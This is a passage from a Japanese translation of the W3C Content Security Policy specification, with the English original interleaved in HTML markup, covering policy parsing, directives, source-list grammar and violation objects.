	<li>
~hashに基づく~source式は、今や，外部~scriptに合致し得る
— 要請を誘発する当の `script$e 要素が［
完全性~metadataの集合を指定していて，それが現在の施策~内に~listされている
］ならば。
詳細は、
<a href="#external-hash">~hashを介して外部~JSを許容する</a>
節を見よ。
◎
Hash-based source expressions may now match external scripts if the script element that triggers the request specifies a set of integrity metadata which is listed in the current policy. Details in §8.4 Allowing external JavaScript via hashes.
</li>
	<li class="wip">
<p>
`disown-opener$dir 指令は、<!-- ＊ -->内容に対する制御を別の閲覧文脈に与えるような仕方では，資源を開けないことを確保する。
◎
The disown-opener directive ensures that a resource can’t be opened in such a way as to give another browsing context control over its contents.
</p>

<p class="issue">
`disown-opener^dir はまだ策定段階にある。
`194$Issue
◎
disown-opener is a work in progress. &lt;https://github.com/w3c/webappsec-csp/issues/194&gt;
</p>
	</li>
	<li>
`navigate-to$dir 指令は、~naviを起動できる端点に対する制御を，資源に与える。
◎
The navigate-to directive gives a resource control over the endpoints to which it can initiate navigation.
</li>
	<li>
~inline違反に対し生成される報告は、関連する指令が `report-sample$pl 式を包含する場合には，空でない`見本$vrを包含することになる。
◎
Reports generated for inline violations will contain a sample attribute if the relevant directive contains the 'report-sample' expression.
</li>
</ol>


		</section>
	</section>
	<section id="_conventions">
<h2>【この訳に固有の表記規約】</h2>

<p>
この訳の，~algoや定義の記述に利用されている各種記号（ ~LET, ~EQ, ~IF, ~THROW, 等々）の意味や定義の詳細は、~SYMBOL_DEF_REFを~~参照されたし。
</p>

<p>
記号［
~EQ, ~NEQ, ~IN, ~NIN
］に添えられる
“`~ACI@”
は、記号の意味を `~ASCII大小無視$による比較に基づくように改めることを表す。
（特に断らない限り、文字列の比較は文字大小区別とする。）
</p>

<p>
~protocol要素
`ALPHA@P,
`DIGIT@P,
`VCHAR@P
は、
`RFC5234$r
<a href="~IETF/rfc5234#appendix-B.1">B.1 節</a>
にて定義される。
~protocol要素
`OWS@P,
`RWS@P,
は、 `RFC7230$r
<a href="~RFC7230#section-3.2.3">3.2.3 節</a>
にて定義される。
尚，これらを含む他の仕様に定義される~protocol要素は
— 実際には~byte列を表現しているものが多いが —
この仕様の中では，暗黙的に`同型に復号-$された`~ASCII文字列$と同一視されている（この仕様に現れる~protocol要素は、どれも~ASCII範囲の［
~byte／文字
］のみからなる）。
</p>


<p>
次の符号位置も利用される：
</p>

<table>
<thead><tr><th>表記
<th>符号位置

<tbody><tr><th>`~asterisk@
<td>U+002A ASTERISK ( `*^l )

<tr><th>`~semicolon@
<td>U+003B SEMICOLON ( `;^l )

<tr><th>`~slash@
<td>U+002F SOLIDUS ( `/^l )

<tr><th>`~comma@
<td>U+002C COMMA ( `,^l )

<!-- 
<tr><th>period
<td>U+002E FULL STOP ( `.^l )
-->

</tbody></table>

<p>
次の~styleが表記に用いられる：
</p>

<ul>
	<li>
`production^p
— ~protocol要素（ ABNF 生成規則）
</li>
	<li>
`example-directive$dir
— ~CSP `指令$
</li>
	<li>
`literal^l
— 文字列~literal（引用符は~dataに含まれない）
</li>
	<li>
`literal^pl
— 文字列~literal。
引用符も~dataに<em >含まれる</em>。
</li>
	<li>
`Example-Header^h
— HTTP ~header名
</li>
	<li>
`element^e
— ~HTML要素
</li>
	<li>
`attribute^a
— ~HTML内容~属性
</li>
	<li>
`idl-construct^I
— 他の~code類（~IDL属性など）
</li>
	<li>
`sample-code^s
— （地の文の中の）見本~code類
</li>
</ul>

<p>
長い行を~page横幅に収める都合により, あるいは読みやすくするため、
HTTP ~headerの例示~codeでは、長い行は折り返した上で，字下げした形で示される
— HTTP/1.1 の構文としては、折り返しは許容されないことに注意。
</p>

<p>
次に挙げる用語は、 `FETCH$r 仕様に定義されていたが，現在は廃されている。
それに伴い，この仕様も更新される必要がある：
</p>

<ul>
	<li>
`要請$の
`~target閲覧文脈@rq
— `~target~client~id$rqに代えられた。
</li>
</ul>


	</section>
	<section id="framework">
<h2 title="Framework">2. 枠組み</h2>

		<section id="framework-infrastructure">
<h3 title="Infrastructure">2.1. 基盤</h3>

<p>
この文書は、
`RFC5234$r に定義される~ABNF文法を利用して構文を指定する。
また、
`RFC7230$r <a href="~RFC7230#section-7">7 節</a>
に定義される `#rule^P ~ABNF拡張にも依拠する。
◎
This document uses ABNF grammar to specify syntax, as defined in [RFC5234]. It also relies on the #rule ABNF extension defined in Section 7 of [RFC7230].
</p>

<p>
この文書の~algoと注釈文に利用する いくつかの基礎的な概念は、
Infra Standard `INFRA$r に依存する。
◎
This document depends on the Infra Standard for a number of foundational concepts used in its algorithms and prose [INFRA].
</p>

		</section>
		<section id="framework-policy">
<h3 title="Policies">2.2. 施策</h3>

<p>
`施策@
は、［
許容される／制約される
］挙動たちを定義する。
それを適用し得るのは［
`Window$I ／ `WorkerGlobalScope$I ／ `WorkletGlobalScope$I
］であり、［
`大域~objの~CSP~listを初期化する$A~algo
］に述べられる。
◎
A policy defines allowed and restricted behaviors, and may be applied to a Window, WorkerGlobalScope, or WorkletGlobalScope as described in §4.2.2 Initialize a global object’s CSP list.
</p>

<p>
各~施策には、次のものが結付けられる：
◎
↓</p>

<dl>
	<dt>`指令~集合@ （ `directive set^en ）</dt>
	<dd>
この施策が適用されるときの含意を定義する 一連の`指令$からなる`有順序~集合$。
◎
Each policy has an associated directive set, which is an ordered set of directives that define the policy’s implications when applied.
</dd>

	<dt>`処置先@ （ `disposition^en ）</dt>
	<dd>
次のいずれか：
`enforce^l ／ `report^l
◎
Each policy has an associated disposition , which is either "enforce" or "report".
</dd>
	<dd class="trans-note">【
順に，［
施策を施行する／施策~違反を報告する
］ことに対応する。
】</dd>

	<dt>`~source@ （ `source^en ）</dt>
	<dd>
次のいずれか：
`header^l ／ `meta^l
◎
Each policy has an associated source, which is either "header" or "meta".
</dd>
	<dd class="trans-note">【
順に，当の施策は［
~HTTP~header／ `meta^e 要素
］により与えられたことを表す。
】</dd>
</dl>

<p>
同じ資源には，複数の`施策$を適用し得る
— それらは、
`~CSP~list@
と称される`施策$の`~list$に収集される。
◎
Multiple policies can be applied to a single resource, and are collected into a list of policies known as a CSP list.
</p>

<p>
`~CSP~list$は、次を満たす`施策$を`包含して$いるならば，
`~headerにより送達された~CSPを包含して@
いるとされる
⇒
`~source$ ~EQ `header^l
◎
A CSP list contains a header-delivered Content Security Policy if it contains a policy whose source is "header".
</p>



<p>
`直列形の~CSP@
（ `serialized CSP^en ）とは、一連の`直列形の指令$を`~semicolon$で区切って連結した `~ASCII文字列$であり，次の`~ABNF$文法に従う：
◎
A serialized CSP is an ASCII string consisting of a semicolon-delimited series of serialized directives, adhering to the following ABNF grammar [RFC5234]:
</p>

<pre class="ABNF">
`serialized-policy@p =
      `serialized-directive$p
      *( `OWS$P ";" [ `OWS$P `serialized-directive$p ] )
; OWS is defined in section 3.2.3 of RFC 7230
</pre>

<p>
`直列形の~CSP~list@
とは、一連の`直列形の~CSP$を`~comma$で区切って連結した`~ASCII文字列$であり，次の`~ABNF$文法に従う：
◎
A serialized CSP list is an ASCII string consisting of a comma-delimited series of serialized CSPs, adhering to the following ABNF grammar [RFC5234]:
</p>

<pre class="ABNF">
`serialized-policy-list@p = 1#`serialized-policy$p
; <span class="comment">
'`#^P' 規則は `RFC7230$r, <a href="~RFC7230#section-7" >7 節</a> に定義される。
◎
; The '#' rule is defined in section 7 of RFC 7230
</span>
</pre>



			<section id="parse-serialized-policy">
<h4 title="Parse a serialized CSP">2.2.1. 直列形の~CSPを構文解析する</h4>

<p>
`直列形の~CSPを構文解析する@A
ときは、所与の
( `直列形の~CSP$ %直列形, `~source$ %~source, `処置先$ %処置先 )
に対し，以下を実行する。
◎
To parse a serialized CSP, given a serialized CSP (serialized), a source (source), and a disposition (disposition), execute the following steps.
</p>

<p>
この~algoは、`施策$ ~objを返す。
%直列形 を構文解析できなかった場合、結果の`施策$の`指令~集合$は空になる。
◎
This algorithm returns a Content Security Policy object. If serialized could not be parsed, the object’s directive set will be empty.
</p>

<ol>
	<li>
%指令~集合 ~LET 空~集合
◎
Let policy be a new policy with an empty directive set, a source of source, and a disposition of disposition.
</li>
	<li>
<p>
`区切子で厳密に分割する$( %直列形, `~semicolon$ )
— その結果を成す
~EACH( %~token )
に対し：
◎
For each token returned by strictly splitting serialized on the U+003B SEMICOLON character (;):
</p>
		<ol>
			<li>
%~list ~LET `~ASCII空白で分割する$( %~token )
◎
Strip leading and trailing ASCII whitespace from token.
◎
If token is an empty string, continue.
</li>
			<li>
~IF［
%~list は空である
］
⇒
~CONTINUE
◎
↑</li>
			<li>
%指令~名 ~LET %~list の先頭の~item
◎
Let directive name be the result of collecting a sequence of code points from token which are not ASCII whitespace.
</li>
			<li>
<p>
~IF［
%指令~集合 内に［
`名前$ ~EQ %指令~名
］なる`指令$はある
］
⇒
~CONTINUE
◎
If policy’s directive set contains a directive whose name is directive name, continue.
</p>

<p>
この事例では、~UAは，重複する指令が無視されたことを~web開発者に通知する~SHOULDである。
例えば，~consoleによる警告が適切になるであろう。
◎
In this case, the user agent SHOULD notify developers that a duplicate directive was ignored. A console warning might be appropriate, for example.
</p>
			</li>
			<li>
%指令~値 ~LET %~list から先頭の~itemを除去した結果の~list
◎
Let directive value be the result of splitting token on ASCII whitespace.
</li>
			<li>
%指令~集合 に新たな`指令$( %指令~名, %指令~値 ) を`付加する$set
◎
Let directive be a new directive whose name is directive name, and value is directive value.
◎
Append directive to policy’s directive set.
</li>
		</ol>
	</li>
	<li>
~RET 次のようにされた，新たな`施策$
⇒＃
`指令~集合$ ~SET %指令~集合,
`~source$ ~SET %~source,
`処置先$ ~SET %処置先
◎
Return policy.
</li>
</ol>

<p class="trans-note">【
上の手続きの反復~内では、より簡明になるよう，原文を等価な形に記述し直している。
】</p>

			</section>
			<section id="parse-serialized-policy-list">
<h4 title="Parse a serialized CSP list ">2.2.2. 直列形の~CSP~listを構文解析する</h4>

<p>
`直列形の~CSP~listを構文解析する@A
ときは、所与の
( `直列形の~CSP~list$ %~list, `~source$ %~source, `処置先$ %処置先 )
に対し，以下を実行する。
◎
To parse a serialized CSP list, given a serialized CSP list (list), a source (source), and a disposition (disposition), execute the following steps.
</p>

<p>
この~algoは、一連の`施策$からなる`~list$を返す。
%~list を構文解析できなかった場合の結果は，空~listになる。
◎
This algorithm returns a list of Content Security Policy objects. If list cannot be parsed, the returned list will be empty.
</p>

<ol>
	<li>
%施策たち ~LET 空`~list$
◎
Let policies be an empty list.
</li>
	<li>
<p>
`~commaで分割する$( %~list )
— その結果を成す
~EACH( %~token )
に対し：
◎
For each token returned by splitting list on commas:
</p>
		<ol>
			<li>
%施策 ~LET `直列形の~CSPを構文解析する$A( %~token, %~source, %処置先 )
◎
Let policy be the result of parsing token, with a source of source, and disposition of disposition.
</li>
			<li>
~IF［
%施策 の`指令~集合$は空である
］
⇒
~CONTINUE
◎
If policy’s directive set is empty, continue.
</li>
			<li>
%施策たち に %施策 を`付加する$
◎
Append policy to policies.
</li>
		</ol>
	</li>
	<li>
~RET %施策たち
◎
Return policies.
</li>
</ol>



			</section>
		</section>
		<section id="framework-directives">
<h3 title="Directives">2.3. 指令</h3>

<p>
各`施策$は、いくつかの
`指令@
からなる`有順序~集合$（`指令~集合$）を包含する
— そのそれぞれは、特定の挙動を制御する。
この文書にて定義される各種~指令の詳細は、
<a href="#csp-directives">~CSP指令</a>
節にて述べられる。
◎
Each policy contains an ordered set of directives (its directive set), each of which controls a specific behavior. The directives defined in this document are described in detail in §6 Content Security Policy Directives.
</p>

<p>
各 `指令$は［
`名前@,
`値@
］の~pairである。
`名前$は 空でない`文字列$であり，`値$は［
空でない`文字列$
］からなる`有順序~集合$†である。
`値$は空にもなり得る。
◎
Each directive is a name / value pair. The name is a non-empty string, and the value is a set of non-empty strings. The value MAY be empty.
</p>

<p class="trans-note">【†
と記されているが、文脈に応じて，直列形の文字列（ `directive-value$p ）を表している箇所も一部ある。
】</p>

<p>
所与の
( `名前$ %名前, `値$ %値 )
からなる`指令$は，
`指令$( %名前, %値 )
とも記される。
</p>

<p>
`直列形の指令@
は、次の`~ABNF$文法に従うような，空白~区切りの，一個以上の~tokenからなる`~ASCII文字列$である：
◎
A serialized directive is an ASCII string, consisting of one or more whitespace-delimited tokens, and adhering to the following ABNF [RFC5234]:
</p>

<pre class="ABNF">
`serialized-directive@p = `directive-name$p [ `RWS$P `directive-value$p ]
`directive-name@p       = 1*( `ALPHA$P / `DIGIT$P / "-" )
`directive-value@p      = *( `09^hex / `20^hex-`2B^hex / `2D^hex-`3A^hex / `3C^hex-`7E^hex )
</pre>

<p>
指令~値（ `directive-value$p ）は、空白, および［
`~semicolon$, `~comma$
を除く `VCHAR$P
］を包含して~MAY／できる。
◎
; Directive values may contain whitespace and VCHAR characters,
; excluding ";" and ","
; RWS is defined in section 3.2.3 of RFC7230. ALPHA, DIGIT, and
; VCHAR are defined in Appendix B.1 of RFC 5234.
</p>

<p>
各 `指令$には、【その種別ごとに】次の~algoが結付けられる：
◎
Directives have a number of associated algorithms:
</p>

<dl class="def-list">
	<dt>`要請前~検査@A</dt>
	<dd>
次を引数にとる
⇒＃
`要請$,
`施策$
◎
A pre-request check, which takes a request and a policy as an argument,＼
</dd>
	<dd>
次を行う間に実行される
⇒
`要請は~CSPにより阻止されるべきか？$A
◎
and is executed during §4.1.3 Should request be blocked by Content Security Policy?.＼
</dd>
	<dd>
他から指定されない限り†，この~algoは `許容ed^i を返す。
◎
This algorithm returns "Allowed" unless otherwise specified.
</dd>
	<dd class="trans-note">【†
当の指令に対し，特に~algoが定義されていない場合には。
以下も同様。
】</dd>

	<dt>`要請後~検査@A</dt>
	<dd>
次を引数にとる
⇒＃
`要請$,
`応答$,
`施策$
◎
A post-request check, which takes a request, a response, and a policy as arguments,＼
</dd>
	<dd>
次を行う間に実行される
⇒
`要請に対する応答は~CSPにより阻止されるべきか？$A
◎
and is executed during §4.1.4 Should response to request be blocked by Content Security Policy?.＼
</dd>
	<dd>
他から指定されない限り，この~algoは `許容ed^i を返す。
◎
This algorithm returns "Allowed" unless otherwise specified.
</dd>

	<dt>`応答~検査@A</dt>
	<dd>
次を引数にとる
⇒＃
`要請$,
`応答$,
`施策$
◎
A response check, which takes a request, a response, and a policy as arguments,＼
</dd>
	<dd>
次を行う間に実行される
⇒
`要請に対する応答は~CSPにより阻止されるべきか？$A
◎
and is executed during §4.1.4 Should response to request be blocked by Content Security Policy?.＼
</dd>
	<dd>
他から指定されない限り，この~algoは `許容ed^i を返す。
◎
This algorithm returns "Allowed" unless otherwise specified.
</dd>

	<dt>`~inline検査@A</dt>
	<dd>
次を引数にとる
⇒＃
`要素$,
型~文字列,
~source文字列
◎
An inline check, which takes an Element a type string, and a source string as arguments,＼
</dd>
	<dd>
次を行う間に実行される
⇒＃
`要素における~inline型の挙動は~CSPにより阻止されるべきか？$A
◎
and is executed during §4.2.4 Should element’s inline type behavior be blocked by Content Security Policy?＼
</dd>
	<dd>
`javascript_^sc 要請に対しては，次を行う間に実行される
⇒
`~sourceから~targetを~navigateするある種別の要請は~CSPにより阻止されるべきか？$A
◎
and during §4.2.5 Should navigation request of type from source in target be blocked by Content Security Policy? for javascript: requests.＼
</dd>
	<dd>
他から指定されない限り，この~algoは `許容ed^i を返す。
◎
This algorithm returns "Allowed" unless otherwise specified.
</dd>

	<dt>`初期化@A</dt>
	<dd>
次を引数にとる
⇒＃
`文書$または`大域~obj$,
`応答$,
`施策$
◎
An initialization, which takes a Document or global object, a response, and a policy as arguments.＼
</dd>
	<dd>
次を行う間に実行される
⇒
`文書の~CSP~listを初期化する$A
◎
This algorithm is executed during §4.2.1 Initialize a Document's CSP list,＼
</dd>
	<dd>
他から指定されない限り，この~algoは何もしない。
◎
and has no effect unless otherwise specified.
</dd>

	<dt>`~navi前~検査@A</dt>
	<dd>
次を引数にとる
⇒＃
`要請$,
~navi種別~文字列 ~IN { `form-submission^l, `other^l },
`閲覧文脈$,
`閲覧文脈$,
`施策$
◎
A pre-navigation check, which takes a request, a navigation type string ("form-submission" or "other"), two browsing contexts, and a policy as arguments,＼
</dd>
	<dd>
次を行う間に実行される
⇒
`~sourceから~targetを~navigateするある種別の要請は~CSPにより阻止されるべきか？$A
◎
and is executed during §4.2.5 Should navigation request of type from source in target be blocked by Content Security Policy?.＼
</dd>
	<dd>
他から指定されない限り，この~algoは `許容ed^i を返す。
◎
It returns "Allowed" unless otherwise specified.
</dd>

	<dt>`~navi応答~検査@A</dt>
	<dd>
次を引数にとる
⇒＃
`要請$, 
~navi種別~文字列 ~IN { `form-submission^l, `other^l },
`応答$,
`閲覧文脈$,
`閲覧文脈$,
検査~種別~文字列 ~IN { `source^l, `response^l },
`施策$
◎
A navigation response check, which takes a request, a navigation type string ("form-submission" or "other"), a response, two browsing contexts, a check type string ("source" or "response"), and a policy as arguments,＼
</dd>
	<dd>
次を行う間に実行される
⇒
`~sourceから~targetを~navigateするある種別の要請に対する応答は~CSPにより阻止されるべきか？$A
◎
and is executed during §4.2.6 Should navigation response to navigation request of type from source in target be blocked by Content Security Policy?.＼
</dd>
	<dd>
他から指定されない限り，この~algoは `許容ed^i を返す。
◎
It returns "Allowed" unless otherwise specified.
</dd>
</dl>



			<section id="framework-directive-source-list">
<h4 title="Source Lists">2.3.1. ~source~list</h4>

<p>
各種 `指令$のうち，多くのものは、
`~source~list@
（ `serialized-source-list$p ）をその`値$にとる。
各`~source~list$は、一連の`文字列$からなる集合である
— その各 `文字列$は、［
~fetchし得る内容であって［
埋込まれ得る／実行され得る
］もの
］を識別するような，次のいずれかの型の
`~source式@
（ `source-expression$p ）を表現する：
◎
Many directives' values consist of source lists: sets of strings which identify content that can be fetched and potentially embedded or executed. Each string represents one of the following types of source expression:
</p>


<ul>
	<li>
~keyword `none$pl （何にも合致しない）
◎
↓</li>
	<li>
他の~keyword（ `keyword-source$p ）
— 例えば
⇒
`self$pl （現在の~URLの生成元に合致する）
◎
Keywords such as 'none' and 'self' (which match nothing and the current URL’s origin, respectively)
</li>
	<li>
直列形の~URL（ `scheme-part$p を伴う `host-source$p ）
— 例えば
⇒
`https://example.com/path/to/file.js^s
（特定の資源に合致する）や,
`https://example.com/^s
（その生成元に属する どの資源にも合致する）
◎
Serialized URLs such as https://example.com/path/to/file.js (which matches a specific file) or https://example.com/ (which matches everything on that origin)
</li>
	<li>
~scheme（ `scheme-source$p ）は、指定された~schemeを持つ どの資源にも合致する
— 例えば
⇒
`https:^s
◎
Schemes such as https: (which matches any resource having the specified scheme)
</li>
	<li>
~host（ `scheme-part$p を伴わない `host-source$p ）
— 例えば
⇒
`example.com^s （~schemeに関わらず，~host上の どの資源にも合致する）や,
`*.example.com^s （~hostの下位domain（下位domainの下位domain, 等々も含む）上の どの資源にも合致する）
◎
Hosts such as example.com (which matches any resource on the host, regardless of scheme) or *.example.com (which matches any resource on the host’s subdomains (and any of its subdomains' subdomains, and so on))
</li>
	<li>
~nonce（ `nonce-source$p ）は、~page上の特定の要素に合致し得る
— 例えば
⇒
`nonce-ch4hvvbHDpv7xCSvXCs3BrNggHdTzxUA^pl
◎
Nonces such as 'nonce-ch4hvvbHDpv7xCSvXCs3BrNggHdTzxUA' (which can match specific elements on a page)
</li>
	<li>
~digest（ `hash-source$p ）は、~page上の特定の要素に合致し得る
— 例えば
⇒
`sha256-abcd...^pl
◎
Digests such as 'sha256-abcd...' (which can match specific elements on a page)
</li>
</ul>

<p>
`直列形の~source~list@
（ `serialized-source-list$p ）
は、次の`~ABNF$文法に従うような，空白~区切りの，一連の`~source式$からなる`~ASCII文字列$である：
◎
A serialized source list is an ASCII string, consisting of a whitespace-delimited series of source expressions, adhering to the following ABNF grammar [RFC5234]:
</p>

<pre class="ABNF">
`serialized-source-list@p
                  = ( `source-expression$p *( `RWS$P `source-expression$p ) )
                  / "`none@pl"

`source-expression@p = `scheme-source$p
                  / `host-source$p
                  / `keyword-source$p
                  / `nonce-source$p
                  / `hash-source$p

; <span class="comment">~scheme ~source式：</span>
;          `https:^l
;        / `custom-scheme:^l
;        / `another.custom-scheme:^l
`scheme-source@p     = `scheme-part$p ":"

; <span class="comment">~host ~source式：</span>
;          `example.com^s
;        / `*.example.com^s
;        / `https://*.example.com:12/path/to/file.js^s
`host-source@p       = [ `scheme-part$p "://" ]
                    `host-part$p
                    [ ":" `port-part$p ]
                    [ `path-part$p ]
`scheme-part@p       = `scheme$p
                  ; scheme is defined in section 3.1 of RFC 3986.
`host-part@p         = "*"
                  / [ "*." ] 1*`host-char$p *( "." 1*`host-char$p )
`host-char@p         = `ALPHA$P / `DIGIT$P / "-"
`port-part@p         = 1*`DIGIT$P / "*"
`path-part@p         = `path-absolute$p
                  ; path-absolute is defined in section 3.3 of RFC 3986.

; <span class="comment">~keyword ~source式：</span>
`keyword-source@p    = "`self@pl"
                  / "`unsafe-inline@pl"
                  / "`unsafe-eval@pl"
                  / "`strict-dynamic@pl"
                  / "`unsafe-hashes@pl"
                  / "`report-sample@pl"
                  / "`unsafe-allow-redirects@pl"

<!-- ＊ISSUE: Bikeshed unsafe-allow-redirects. -->

; <span class="comment">~nonce ~source式：</span>
; `'nonce-[nonce goes here]'^s
`nonce-source@p      = "'nonce-" `base64-value$p "'"
`base64-value@p      = 1*( `ALPHA$P / `DIGIT$P / "+" / "/" / "-" / "_" )*2( "=" )

; <span class="comment">~digest ~source式：</span>
; `'sha256-[digest goes here]'^s
`hash-source@p       = "'" `hash-algorithm$p "-" `base64-value$p "'"
`hash-algorithm@p    = "sha256" / "sha384" / "sha512"
</pre>


<p>
`host-char$p 生成規則は、意図的に~ASCII文字のみを包含するようにされている。
国際化~domain名は，`直列形の~CSP$の一部として直に手入力できないので、代わりに Punycode `RFC3492$r に符号化され~MUST。
例えば，
~domain `üüüüüü.de^s
は、
`xn--tdaaaaaa.de^s
として表現され~MUST。
◎
The host-char production intentionally contains only ASCII characters; internationalized domain names cannot be entered directly as part of a serialized CSP, but instead MUST be Punycode-encoded [RFC3492]. For example, the domain üüüüüü.de MUST be represented as xn--tdaaaaaa.de.
</p>

<p class="note">注記：
IP ~addressは，上の文法に合致するが、~source式~内に利用されるときに 実際に合致する~URLは，
`127.0.0.1^s
に限られる（詳細は、
`~urlは ( 生成元, ~redirect回数 ) について~source~listに合致するか？$A
を見よ）。
IP ~addressが備える保安~上の特質には疑義があるので、可能なら~hostnameが選好されるべきである。
◎
Note: Though IP address do match the grammar above, only 127.0.0.1 will actually match a URL when used in a source expression (see §6.6.1.5 Does url match source list in origin with redirect count? for details). The security properties of IP addresses are suspect, and authors ought to prefer hostnames whenever possible.
</p>

<p class="note">注記：
`base64-value$p 文法では
`base64$p, `base64url$p
両~符号化-法とも許容される。
これらの符号化-法は、
`hash-source$p 値の処理-時には，等価に扱われる。
その一方，~nonceは、 `base64-value$p 文法を利用して厳格に文字列~照合される：
可用な文字を制限し，~server側~運用者にとっての複雑さを抑制するため（符号化-法, 等々）。
が，~UAは、実際には下層の値について~careしないし， `nonce-source$p 値を復号することもない。
◎
Note: The base64-value grammar allows both base64 and base64url encoding. These encodings are treated as equivalant when processing hash-source values. Nonces, however, are strict string matches: we use the base64-value grammar to limit the characters available, and reduce the complexity for the server-side operator (encodings, etc), but the user agent doesn’t actually care about any underlying value, nor does it do any decoding of the nonce-source value.
</p>

			</section>
		</section>
		<section id="framework-violation">
<h3 title="Violations">2.4. 違反</h3>

<p>
`違反@
は、`大域~obj$に結付けられている`施策$~objの集合に反した［
動作／資源
］を表現する。
◎
A violation represents an action or resource which goes against the set of policy objects associated with a global object.
</p>


<p>
各 `違反$は、次のものを持つ：
◎
↓</p>

<dl class="def-list">

	<dt>`大域~obj@vr</dt>
	<dd>
違反された`施策$を持つ`大域~obj$
◎
Each violation has a global object, which is the global object whose policy has been violated.
</dd>

	<dt>`~url@vr</dt>
	<dd>
この違反の`大域~obj$vrの`~URL$
◎
Each violation has a url which is its global object’s URL.
</dd>

	<dt>`状態code@vr</dt>
	<dd>
［
大域~objを~instance化させた資源
］の`~HTTP状態code$を表現する，非負~整数
◎
Each violation has a status which is a non-negative integer representing the HTTP status code of the resource for which the global object was instantiated.
</dd>

	<dt>`資源@vr</dt>
	<dd>
施策に違反した資源を表現する
— 次のいずれか
⇒
`null^l ／ `inline^l ／ `eval^l ／ `~URL$
◎
Each violation has a resource, which is either null, "inline", "eval", or a URL. It represents the resource which violated the policy.
</dd>

	<dt>`~referrer@vr</dt>
	<dd>
施策に違反した資源の~referrerを表現する
— 次のいずれか
⇒
~NULL ／ `~URL$
◎
Each violation has a referrer, which is either null, or a URL. It represents the referrer of the resource whose policy was violated.
</dd>

	<dt>`施策@vr</dt>
	<dd>
違反された`施策$。
◎
Each violation has a policy, which is the policy that has been violated.
</dd>

	<dt>`処置先@vr</dt>
	<dd>
違反された施策の`処置先$。
◎
Each violation has a disposition, which is the disposition of the policy that has been violated.
</dd>

	<dt>`有効な指令@vr</dt>
	<dd>
［
施行により この違反を生じさせた，`施策$vr内の`指令$
］を表現する，空でない文字列。
◎
Each violation has an effective directive which is a non-empty string representing the directive whose enforcement caused the violation.
</dd>

	<dt>`~source~file@vr</dt>
	<dd>
次のいずれか
⇒
~NULL ／ `~URL$
◎
Each violation has a source file, which is either null or a URL.
</dd>

	<dt>`行番号@vr</dt>
	<dd>
非負~整数。
◎
Each violation has a line number, which is a non-negative integer.
</dd>

	<dt>`列番号@vr</dt>
	<dd>
非負~整数。
◎
Each violation has a column number, which is a non-negative integer.
</dd>

	<dt>`要素@vr</dt>
	<dd>
~NULL または要素。
◎
Each violation has a element, which is either null or an element.
</dd>

	<dt>`見本@vr</dt>
	<dd>
文字列。
他から指定されない限り，空~文字列とする。
◎
Each violation has a sample, which is a string. It is the empty string unless otherwise specified.
</dd>
	<dd class="note">注記：
`見本$vrは、違反を生じさせた~inline［
~script ／ ~event~handler ／ ~style
］の最初の 40 文字で拡充されることになる。
外部~fileによる違反に際しては、見本は違反~報告には含められない。
◎
Note: A violation’s sample will be populated with the first 40 characters of an inline script, event handler, or style that caused an violation. Violations which stem from an external file will not include a sample in the violation report.
</dd>

</dl>


			<section id="create-violation-for-global">
<h4 title="Create a violation object for global, policy, and directive">2.4.1. ( %大域~obj, %施策, %指令~名 ) から違反~objを作成する</h4>

<p>
次の~algoは、新たな`違反$~objを，所与の
( `大域~obj$ %大域~obj, `施策$ %施策, `文字列$ %指令~名 )
から作成して、それを初期~dataの集合で拡充する：
◎
Given a global object (global), a policy (policy), and a string (directive), the following algorithm creates a new violation object, and populates it with an initial set of data:
</p>

<ol>
	<li>
%違反 ~LET 次のようにされた，新たな `違反$
⇒＃
`大域~obj$vr ~SET %大域~obj,
`施策$vr ~SET %施策,
`有効な指令$vr ~SET %指令~名,
`資源$vr ~SET `null^l
◎
Let violation be a new violation whose global object is global, policy is policy, effective directive is directive, and resource is null.
</li>
	<li>
<p>
~IF［
~UAは，現在~scriptを実行している
］~AND［
%大域~obj から ~scriptの~source~fileの
( ~URL, 行番号, 列番号 )
を抽出できる
］
⇒
%違反 の
( `~source~file$vr, `行番号$vr, `列番号$vr )
~SET それら
◎
If the user agent is currently executing script, and can extract a source file’s URL, line number, and column number from the global, set violation’s source file, line number, and column number accordingly.
</p>

<p class="issue">
この種のものは，どこかで指定されているのか？
`ECMA262$r には，有用な~~記述は見当たらない。
◎
Is this kind of thing specified anywhere? I didn’t see anything that looked useful in [ECMA262].
</p>

<p class="note">注記：
~UAは、［
`~source~file$vr が，~pageにより要請された~redirect前の~URLになる
］ことを確保する必要がある。
それが可能でない場合、~UAは，~URLを生成元のみに剥いで，意図されない漏洩を避ける必要がある。
◎
Note: User agents need to ensure that the source file is the URL requested by the page, pre-redirects. If that’s not possible, user agents need to strip the URL down to an origin to avoid unintentional leakage.
</p>

	</li>
	<li>
~IF［
%大域~obj は `Window$I ~objである
］
⇒
%違反 の`~referrer$vr ~SET
%大域~obj の `document$m の
<a href="~HTMLdom#dom-document-referrer">`referrer^m</a>
◎
If global is a Window object, set violation’s referrer to global’s document's referrer.
</li>
	<li>
<p>
%違反 の`状態code$vr ~SET
%違反 の`大域~obj$vrに結付けられている資源の~HTTP状態code
◎
Set violation’s status to the HTTP status code for the resource associated with violation’s global object.
</p>

<p class="issue">
状態codeは，正確にはどうやって取得する？
— 実際には どこにも格納されていない。
◎
How, exactly, do we get the status code? We don’t actually store it anywhere.
</p>
	</li>
	<li>
~RET %違反
◎
Return violation.
</li>
</ol>



			</section>
			<section id="create-violation-for-request">
<h4 title="Create a violation object for request, policy, and directive">2.4.2. ( %要請, %施策, %指令~名 ) から 違反~objを作成する</h4>

<p>
次の~algoは、新たな`違反$~objを，所与の
( `要請$ %要請, `施策$ %施策, 文字列 %指令~名 )
から作成して、それを 初期~dataの集合で拡充する：
◎
Given a request (request), a policy (policy), and a string (directive), the following algorithm creates a new violation object, and populates it with an initial set of data:
</p>

<ol>
	<li>
%違反 ~LET `新たな違反~obj$A1(
%要請 の`~client$rqの`大域~obj$enV, %施策, %指令~名
)
◎
Let violation be the result of executing §2.4.1 Create a violation object for global, policy, and directive on request’s client’s global object, policy, and directive.
</li>
	<li>
<p>
%違反 の`資源$vr ~SET %要請 の`~url$rq
◎
Set violation’s resource to request’s url.
</p>

<p class="note">注記：
ここでは
%要請 の`~url$rqを利用する
— 
その`現在の~url$rq<em >ではなく</em>
—
後者は、［
~pageから~accessされては~MUST_NOTような，~redirect~target
］についての情報を包含することもあるので。
◎
Note: We use request’s url, and not its current url, as the latter might contain information about redirect targets to which the page MUST NOT be given access.
</p>
	</li>
	<li>
~RET %違反
◎
Return violation.
</li>
</ol>

			</section>
		</section>
	</section>
	<section id="policy-delivery">
<h2 title="Policy Delivery">3. 施策の送達</h2>

<p>
